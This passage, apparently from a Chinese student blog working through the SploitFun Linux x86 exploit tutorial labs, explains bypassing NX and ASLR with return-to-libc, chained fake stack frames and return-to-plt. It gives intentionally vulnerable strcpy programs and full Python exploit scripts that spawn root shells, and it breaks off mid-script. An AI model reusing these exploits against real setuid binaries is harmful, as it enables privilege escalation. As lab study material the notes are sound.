style="zoom:80%;">                      <p>这时可以看到堆栈段只包含读写，不能执行</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173004437.png" alt="image-20210730173004437" style="zoom:80%;"><p>如何绕过NX位并实现任意代码执行？</p><p>可以使用叫做“return-to-libc”的攻击技术绕过NX 位。这里返回地址被一个特定的 libc函数地址覆盖（而不是包含shellcode的堆栈地址）。例如，如果攻击者想要生成一个shell，那么他将使用 system 地址覆盖返回地址，并在堆栈中设置 system 所需的相应参数，以便成功调用它。</p><p>首先我们得找到system等地址</p><p>通过调试可以找到</p><p><strong>system地址为0xb7e5f460</strong></p><p><strong>Exit地址为0xb7e52fe0</strong></p><p><strong>/bin/sh地址为0xb7f81ff8</strong></p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173054568.png" alt="image-20210730173054568" style="zoom:80%;"><h2 id="3-构建exp攻击"><a class="markdownIt-Anchor" href="#3-构建exp攻击"></a> 3. 构建exp攻击</h2><p>有了上述条件，我们可以构建这样的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#exp.py</span><br>#!/usr/bin/env python<br><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">import</span> <span class="hljs-title">call</span></span><br><span class="hljs-class"><span class="hljs-title">system</span> =</span>  <span class="hljs-number">0xb7e5f460</span> <br><span class="hljs-built_in">exit</span> = <span class="hljs-number">0xb7e52fe0</span> <br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br><span class="hljs-meta">#endianess conversion</span><br>def conv(num):<br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-meta">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system)<br>buf += conv(<span class="hljs-built_in">exit</span>)<br>buf += conv(binsh_arg)<br>print buf<br>print <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure><p>测试成功拿到rootshell</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173210271.png" alt="image-20210730173210271" style="zoom:80%;"><h1 id="实验五使用链式-return-to-libc-绕过-nx-位未成功"><a class="markdownIt-Anchor" href="#实验五使用链式-return-to-libc-绕过-nx-位未成功"></a> 实验五：使用链式 return-to-libc 绕过 NX 位（未成功）</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理</h2><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>seteuid(getuid()); <span class="hljs-comment">/* Temporarily drop privileges */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>什么是最小权限原则？</strong></p><p>此技术允许root setuid程序仅在需要时获取root权限。这指的是当需要时，获得root 权限，当不需要它们时，它将丢弃获得的root权限。正常做法是root setuid程序之 后，用户获取输入之前删除root权限。因此，即使用户输入是恶意的，攻击者也不 会得到root shell。例如下面的漏洞代码不允许攻击者获取root shell。</p><p>如上所述，链接 setuid ， system 和 exit 将允许我们能够利用漏洞 代码 vuln 。但由于以下两个问题，不是一个直接的任务：</p><p>1、在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的 函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。 2、 seteuid_arg 应为零，但是strcpy遇到\00会结束输入，所以我们得找到一个字符串0的地址来避免这个问题</p><p>调用以下libc函数（按照列出的顺序）</p><p>seteuid(0)</p><p>system(“sh”)</p><p>exit()</p><p>构建rop链就可以获得root shell。</p><h2 id="2攻击思路"><a class="markdownIt-Anchor" href="#2攻击思路"></a> 2.攻击思路</h2><p>通过leave ret构建假栈帧，执行我们的rop链，因为strcpy函数会对\x00进行截断，我们要构建setuid（0）这个rop链接，只能通过4个sprintf函数把4个\x00拷到栈上。</p><p>Leave ret 这个指令汇编是</p><p><strong>mov esp ebp</strong></p><p><strong>pop ebp</strong></p><p><strong>pop eip</strong></p><p>通过这几个指令可以把我们伪造的fake_ebp变成下一个栈的栈底，然后执行fake_ebp+4位置的指令，从而可以按顺序执行我们构造的rop链。</p><p>我们需要构造4个sprintf函数把\x00拷贝到setuid()函数的参数位置，然后继续构建fake_ebp执行setuid()，system(/bin/sh)就可以拿到rootshell</p><p>编译完成后，查看mian函数的堆栈</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173554156.png" alt="image-20210730173554156" style="zoom:80%;">         <p>尝试输入268个A和4个B</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173611629.png" alt="image-20210730173611629" style="zoom:80%;"><p>可以知道eip的位置还是之前的268个A的后面4位</p><p>题目原理是伪造栈，进行栈迁移，然后把0复制到栈上进行操作，但是我实际操作时遇到了诸多问题</p><ol><li><p>题目中strcpy函数不可以用，但是在我使用的libc上是可用的，可以通过strcpy把libc上strcpy函数的地址复制到栈上，所以题目中用了sprintf函数</p></li><li><p>但是实际上在我使用sprintf函数时，它的地址会被截断，无法使用</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173658115.png" alt="image-20210730173658115" style="zoom:80%;"></li></ol><p>这里我sprintf函数的地址是0xb7e6b920，会导致这个函数之后的rop链接复制不了</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173712364.png" alt="image-20210730173712364" style="zoom:80%;"><ol start="3"><li>实际上我也使用其他乌班图尝试了一下，但是sprintf函数并不能把字符复制到栈上，如下，这里rop链可以执行，但是并不能复制到栈上，我也不知道为什么</li></ol> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173731850.png" alt="image-20210730173731850" style="zoom:80%;"><p>这是sprintf的3个参数设定，经过调试知道题中是把0xbffff23c地址的00复制到0xbffff210，0xbffff23c的位置是strcpy截断的\00的位置</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173811988.png" alt="image-20210730173811988" style="zoom:80%;"><p>实际上这里rop链在sprintf函数中就会突然跳转到一个错误地址然后停止，</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173833967.png" alt="image-20210730173833967" style="zoom:80%;"><p><strong>基于以上原因，我只能借用了同学的一个可以完成此实验的环境进行调试</strong></p><p>这里的sprintf函数地址是0xb7e6cf80，不会被strcpy截断</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173851194.png" alt="image-20210730173851194" style="zoom:80%;"><p>/bin/sh的地址是0xb7f81ff8</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173912815.png" alt="image-20210730173912815" style="zoom:80%;"><p>我们构建的栈空间应该是这样的</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173936029.png" alt="image-20210730173936029" style="zoom:80%;"><p>把构造的exp输入栈后，栈空间是这样的，需要把0xbffff274位置的\x00复制到0xbffff250位置，复制4次，每次加1</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730174002589.png" alt="image-20210730174002589" style="zoom:80%;"><p>Payload脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct <br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call <br>fake_ebp0 = <span class="hljs-number">0xbffff1e0</span><br>fake_ebp1 = <span class="hljs-number">0xbffff1f8</span> <br>fake_ebp2 = <span class="hljs-number">0xbffff210</span> <br>fake_ebp3 = <span class="hljs-number">0xbffff228</span> <br>fake_ebp4 = <span class="hljs-number">0xbffff244</span> <br>fake_ebp5 = <span class="hljs-number">0xbffff254</span> <br>fake_ebp6 = <span class="hljs-number">0xbffff264</span> <br>fake_ebp7 = <span class="hljs-number">0xbffff274</span> <br>leave_ret = <span class="hljs-number">0x0804851c</span> <br>sprintf_addr = <span class="hljs-number">0xb7e6cf80</span> <br>seteuid_addr = <span class="hljs-number">0xb7f08970</span><br>system_addr = <span class="hljs-number">0xb7e5f460</span> <br>exit_addr = <span class="hljs-number">0xb7e52fe0</span> <br>sprintf_arg1 = <span class="hljs-number">0xbffff250</span> <br>sprintf_arg2 = <span class="hljs-number">0x80485f0</span> <br>sprintf_arg3 = <span class="hljs-number">0xbffff274</span><br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br>exit_arg = <span class="hljs-number">0xffffffff</span> <br><span class="hljs-comment">#endianess convertion </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span> <br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<br>buf=<span class="hljs-string">&quot;A&quot;</span>* <span class="hljs-number">264</span><br>buf += conv(fake_ebp0) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Below four stack frames are for sprintf (to setup seteuid arg ) </span><br>buf += conv(fake_ebp1) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp2) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret)<br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp3) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp4) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br><span class="hljs-comment">#Dummy - To avoid null byte in fake_ebp4. </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for seteuid </span><br>buf += conv(fake_ebp5) <br>buf += conv(seteuid_addr) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Dummy - This arg is zero&#x27;d by above four sprintf calls </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for system </span><br>buf += conv(fake_ebp6) <br>buf += conv(system_addr) <br>buf += conv(leave_ret) <br>buf += conv(binsh_arg) <br><span class="hljs-comment">#Below stack frame is for exit </span><br>buf += conv(fake_ebp7) <br>buf += conv(exit_addr) <br>buf += conv(leave_ret) <br>buf += conv(exit_arg) <br><span class="hljs-built_in">print</span> buf <br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot; </span><br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br></code></pre></td></tr></table></figure><h1 id="实验六绕过aslr-第一部分"><a class="markdownIt-Anchor" href="#实验六绕过aslr-第一部分"></a> 实验六：绕过ASLR – 第一部分</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1原理书中内容"><a class="markdownIt-Anchor" href="#1原理书中内容"></a> 1．原理（书中内容）</h2><p>什么是 ASLR?</p><p>地址空间布局随机化（ASLR）是随机化的利用缓解技术: 堆栈地址 堆地址 共享库地址 一旦上述地址被随机化，特别是当共享库地址被随机化时，我们采取的绕过NX 位的方法不会生效，因为攻击者需要知道libc基地址。但这种缓解技术并不完全是万无一失的。</p><p>libc函数地址计算如下：</p><p>libc函数地址 = libc 基址 + 函数偏移</p><p><strong>什么是return-to-plt?</strong></p><p>在这种技术中，而不是返回到libc函数（其地址是随机的）攻击者返回到一个函数的PLT（其地址不是随机的-其地址在执行之前已知）。由于 function@PLT 不是随机的，所以攻击者不再需要预测libc的基地址，而是可以简单地返回到 function@PLT 来调用 function 。</p><p><strong>什么是PLT</strong>**，如何通过调用 function@PLT** <strong>来调用“函数”？</strong></p><p>要了解过程链接表（PLT），先让我简要介绍一下共享库！</p><p>与静态库不同，共享库代码段在多个进程之间共享，而其数据段对于每个进程是唯一的。这有助于减少内存和磁盘空间。由于代码段在多个进程之间共享，所以应该只有 read 和 execute 权限，因此动态链接器不能重新定位代码段中存在的数据符号或函数地址（因为它没有写权限）。那么动态链接如何在运行时重新定位共享库符号而不修改其代码段?它使用PIC完成！</p><p><strong>什么是PIC</strong>**？**</p><p>位置无关代码（PIC）是为了解决这个问题而开发的 - 它确保共享库代码段在多个 进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享 库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变！ 动态链接器以两种不同的方式重新定位PIC中发现的全局符号和函数，如下所述：</p><p><strong>全局偏移表（GOT</strong>**）**： 全局偏移表包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。 当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，指令指向 GOT中条目。当加载共享库时，GOT条目由动态链接器重新定位。因此，PIC使用 该表来重新定位具有单个间接级别的全局符号。</p><p><strong>过程链接表（PLT</strong>**）**： 过程链接表包含每个全局函数的存根代码。代码段中的调用 指令不直接调用函数（ function ），而是调用存根代码 （ function @ PLT ）。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到GOT（ GOT [n] ）。这次解析仅在函数（ function ）的第一次调用 期间发生，稍后当代码段中的调用指令调用存根代码（ function @PLT ）时，而</p><p>不是调用动态链接器来解析函数地址（ function ）存根代码直接从 GOT（ GOT [n] ）获取功能地址并跳转到它。因此，PIC使用这个表来重新定位 具有两级间接的功能地址。</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">/* Eventhough shell() function isnt invoked directly, its needed</span><br><span class="hljs-comment">here since &#x27;system@PLT&#x27; and &#x27;exit@PLT&#x27; stub code should be pres</span><br><span class="hljs-comment">ent in executable to successfully exploit it. */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2漏洞利用"><a class="markdownIt-Anchor" href="#2漏洞利用"></a> 2.漏洞利用</h2><p>首先反汇编查看程序</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102132605.png" alt="image-20210802102132605" style="zoom:80%;">         <p>这样可以看到system和exit的地址</p><p>然后使用ida查看‘bin/sh’的地址为0x0804850</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102157354.png" alt="image-20210802102157354" style="zoom:80%;"><p>构建exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>system = <span class="hljs-number">0x8048380</span><br>exit = <span class="hljs-number">0x80483a0</span><br>binsh = <span class="hljs-number">0x080485B0</span> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">272</span><br>buf += conv(system)<br>buf += conv(exit)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure><p>成功得到rootshell</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102245437.png" alt="image-20210802102245437" style="zoom:80%;"><h1 id="实验七绕过-aslr-第二部分"><a class="markdownIt-Anchor" href="#实验七绕过-aslr-第二部分"></a> 实验七：绕过 ASLR – 第二部分</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><h2 id="1-原理-4"><a class="markdownIt-Anchor" href="#1-原理-4"></a> 1． 原理</h2><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译过程：</p><img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102403136.png" alt="image-20210802102403136" style="zoom:80%;"><p>验证当随机化打开时不同的 Libc 基址：</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102421800.png" alt="image-20210802102421800" style="zoom:80%;"><p>可以看到，Libc 随机化仅限于3个十六进制位。而且前面只有0xb75和0xb76因此我们可以在最多 256 x2次尝试内，得到 root shell。</p><p>所以编写一个循环爆破脚本。</p><h2 id="2找到地址构建exp"><a class="markdownIt-Anchor" href="#2找到地址构建exp"></a> 2.找到地址，构建exp</h2><p>我们先用指令寻找system以及exit的偏移地址</p><p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</p><p>所以exit的偏移地址是0x00032fe0</p><p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102441989.png" alt="image-20210802102441989" style="zoom:80%;"><p>得到system的偏移地址0x0003f460</p><p>输入strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep “/bin/sh”</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102457948.png" alt="image-20210802102457948" style="zoom:80%;"><p>得到/bin/sh的偏移地址是0x161ff8</p><p>我们选择一个libc基址为0xb7525000进行爆破</p><p>*这里由于自己找到的/bin/sh基址使用会报错，不知道为啥解决不了，只好使用报告里的/bin/sh地址</p><p>构建exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>libc_base_addr = <span class="hljs-number">0xb7525000</span>   <span class="hljs-comment">#猜测的libc基址</span><br>exit_off = <span class="hljs-number">0x00032fe0</span>    <span class="hljs-comment">#exit偏移</span><br>system_off = <span class="hljs-number">0x0003f460</span>   <span class="hljs-comment">#system偏移</span><br>system_addr = libc_base_addr + system_off<br>exit_addr = libc_base_addr + exit_off<br>binsh = <span class="hljs-number">0x804827d</span>  <span class="hljs-comment">#bin/sh地址</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system_addr)<br>buf += conv(exit_addr)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable 